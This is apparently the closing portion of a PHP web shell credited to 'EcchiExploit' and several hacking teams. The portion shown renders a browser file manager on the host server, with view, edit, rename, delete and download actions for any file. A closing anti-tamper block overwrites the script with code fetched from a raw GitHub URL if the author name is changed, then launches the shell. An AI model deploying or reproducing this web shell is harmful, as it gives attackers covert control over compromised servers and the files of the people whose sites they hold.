                              $act_dir = "<a class='text-decoration-none text-dark' href='?act=newfile&dir=$dir'>newfile</a> | <a class='text-decoration-none text-dark' href='?act=newfolder&dir=$dir'>newfolder</a>";
                           } else {
                              $act_dir = "<a class='text-decoration-none text-dark' href='?act=rename_dir&dir=$dir/$direc'>rename</a> | <a class='text-decoration-none text-dark' href='?act=delete_dir&dir=$dir/$direc'>delete</a>";
                           }
                           if (!is_dir("$dir/$direc")) continue;
                        ?>
                           <tr>
                              <td class="border-dark">
                                 <i class="far fa-folder"></i>
                                 <?= $href ?>
                              </td>
                              <td class="border-dark text-center"><?= $dtype ?></td>
                              <td class="border-dark text-center"><?= w("$dir/$direc", perms("$dir/$direc")) ?></td>
                              <td class="border-dark text-danger"><?= $act_dir ?></td>
                           </tr>
                     <?php
                        }
                     }
                  } else {
                     echo "<p class='font-weight-bold text-danger'>can't open directory.</p>";
                  }
                  foreach ($scandir as $file) {
                     $infoext = pathinfo($file);
                     $ftype = filetype("$dir/$file");

                     if ($infoext['extension'] == 'php') {
                        $i = '<i class="fab fa-php"></i>';
                        $ftype = 'php';
                     } else if ($infoext['extension'] == 'html' || $infoext['extension'] == 'htm') {
                        $i = '<i class="fab fa-html5"></i>';
                        $ftype = 'html';
                     } else if ($infoext['extension'] == 'zip' || $infoext['extension'] == 'rar') {
                        $i = '<i class="fas fa-file-archive"></i>';
                        $ftype = ($infoext['extension'] == 'zip') ? 'zip' : 'rar';
                     } else if ($infoext['extension'] == 'jpg' || $infoext['extension'] == 'jpeg' || $infoext['extension'] == 'png') {
                        $i = '<i class="fas fa-file-image"></i>';
                        $ftype = 'image';
                     } else if ($infoext['extension'] == 'txt') {
                        $i = '<i class="far fa-file-code"></i>';
                        $ftype = 'text file';
                     } else if ($infoext['extension'] == 'css') {
                        $i = '<i class="fab fa-css3-alt"></i>';
                        $ftype = 'css';
                     } else if ($infoext['extension'] == 'js') {
                        $i = '<i class="fab fa-js-square"></i>';
                        $ftype = 'js';
                     } else if ($infoext['extension'] == 'doc' || $infoext['extension'] == 'docx') {
                        $i = '<i class="fab fa-js-square"></i>';
                        $ftype = ($infoext['extension'] == 'doc') ? 'doc' : 'docx';
                     } else if ($infoext['extension'] == 'pdf') {
                        $i = '<i class="fas fa-file-pdf"></i>';
                        $ftype = 'pdf';
                     } else if ($infoext['extension'] == 'py') {
                        $i = '<i class="fab fa-python"></i>';
                        $ftype = 'python';
                     } else if ($infoext['extension'] == 'mp4' || $infoext['extension'] == 'mp3') {
                        $i = ($infoext['extension'] == 'mp4') ? '<i class="fas fa-file-video"></i>' : '<i class="fas fa-file-audio"></i>';
                        $ftype = ($infoext['extension'] == 'mp4') ? 'video' : 'audio';
                     } else if ($infoext['extension'] == 'htaccess' || $infoext['extension'] == 'ini') {
                        $i = '<i class="fas fa-cog"></i>';
                        $ftype = ($infoext['extension'] == 'htaccess') ? 'htaccess' : 'configuration file';
                     } else {
                        $i = '<i class="fas fa-file"></i>';
                     }

                     if (!is_file("$dir/$file")) continue;
                     ?>
                     <tr>
                        <td class="border-dark">
                           <?= $i ?>
                           <a class="text-white" href="?act=view&dir=<?= "$dir&file=$dir/$file" ?>"><?= $file ?></a>
                        </td>
                        <td class="border-dark text-center"><?= $ftype ?></td>
                        <td class="border-dark text-center"><?= w("$dir/$file", perms("$dir/$file")) ?></td>
                        <td class="text-danger border-dark">
                           <a class="text-decoration-none text-dark" href="?act=edit&dir=<?= "$dir&file=$dir/$file" ?>">edit</a> |
                           <a class="text-decoration-none text-dark" href="?act=rename&dir=<?= "$dir&file=$dir/$file" ?>">rename</a> |
                           <a class="text-decoration-none text-dark" href="?act=delete&dir=<?= "$dir&file=$dir/$file" ?>">delete</a> |
                           <a class="text-decoration-none text-dark" href="?act=download&dir=<?= "$dir&file=$dir/$file" ?>">download</a>
                        </td>
                     </tr>
                  <?php
                  }
                  ?>
                     </tbody>
                  </table>
               </div>
               <div class="jumbotron text-center bg-dark" style="margin-bottom:0">
                  <h4 class="font-weight-bold text-white"><?= author ?> <span class="text-info">Copyright &copy; <?= date("Y") ?></span></h4>
                  <h3 class="mb-3">
                     <a target="_blank" href="https://github.com/dmzhari/">
                        <i class="fab fa-github"></i>
                     </a>
                     <a target="_blank" href="https://ecchiexploit.blogspot.com/">
                        <i class="fab fa-blogger"></i>
                     </a>
                     <a target="_blank" href="https://www.youtube.com/channel/UCRq0YSk2gU6YFKsk8ZdVeGQ">
                        <i class="fab fa-youtube"></i>
                     </a>
                     <a target="_blank" href="https://facebook.com/dmz.hari.9">
                        <i class="fab fa-facebook"></i>
                     </a>
                     <a target="_blank" href="https://twitter.com/harigrimorum990">
                        <i class="fab fa-twitter-square"></i>
                     </a>
                     <a target="_blank" href="https://wa.me/+6283822080039">
                        <i class="fab fa-whatsapp-square"></i>
                     </a>
                  </h3>
                  <button type="button" class="btn btn-info btn-lg" data-toggle="collapse" data-target="#thanks" aria-controls="thanks">Thanks To</button>
                  <div class="collapse multi-collapse p-3" id="thanks">
                     <button type="button" class="btn btn-info" data-toggle="modal" data-target="#team">MyTeam</button>
                     <button type="button" class="btn btn-info" data-toggle="modal" data-target="#friend">My Friend</button>
                  </div>
                  <div id="team" class="modal fade" role="dialog">
                     <div class="modal-dialog">
                        <div class="modal-content">
                           <div class="modal-header">
                              <h4 class="modal-title">Team</h4>
                              <button type="button" class="close" data-dismiss="modal">&times;</button>
                           </div>
                           <div class="modal-body">
                              <p>Manusia Biasa Team</p>
                              <p>BHI OFFICIAL</p>
                              <p>Dark 3xploit Cyber</p>
                              <p>2Easy 4Hack Team</p>
                           </div>
                           <div class="modal-footer">
                              <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
                           </div>
                        </div>
                     </div>
                  </div>
                  <div id="friend" class="modal fade" role="dialog">
                     <div class="modal-dialog">
                        <div class="modal-content">
                           <div class="modal-header">
                              <h4 class="modal-title">My Friend</h4>
                              <button type="button" class="close" data-dismiss="modal">&times;</button>
                           </div>
                           <div class="modal-body">
                              <p class="text-wrap">
                                 Omest - Wildan - Arifsyn - Accil - Rapeler - Colt - Rijal - Batu - Didi - Dwi - Riy - Talia
                                 - Arianda
                              </p>
                           </div>
                           <div class="modal-footer">
                              <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
                           </div>
                        </div>
                     </div>
                  </div>
               </div>
               <script type="text/javascript">
                  let mybutton = document.getElementById("btn-back-to-top");

                  window.onscroll = function() {
                     scrollFunction();
                  };

                  function scrollFunction() {
                     if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
                        mybutton.style.display = "block";
                     } else {
                        mybutton.style.display = "none";
                     }
                  }

                  mybutton.addEventListener("click", backToTop);

                  function backToTop() {
                     document.body.scrollTop = 0;
                     document.documentElement.scrollTop = 0;
                  }
               </script>
               <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.bundle.min.js" integrity="sha384-Piv4xVNRyMGpqkS2by6br4gNJ7DXjqk09RmUpJ8jgGtD7zP9yug3goQfGII0yAns" crossorigin="anonymous"></script>
   </body>

   </html>
<?php
}

/* Change This For Fun Hehe */
if (author != './EcchiExploit') {
   $file = basename($_SERVER['SCRIPT_FILENAME']);
   $open = fopen($file, 'w');
   fwrite($open, file_get_contents('https://raw.githubusercontent.com/dmzhari/ecchi-shell/main/ecchishell.php'));
   fclose($open);

   echo '<script>alert("Please Dont Change Author!!")</script>';
   echo "<script>window.location.href= '" . $_SERVER['PHP_SELF'] . "'</script>";
} else {
   shell();
}
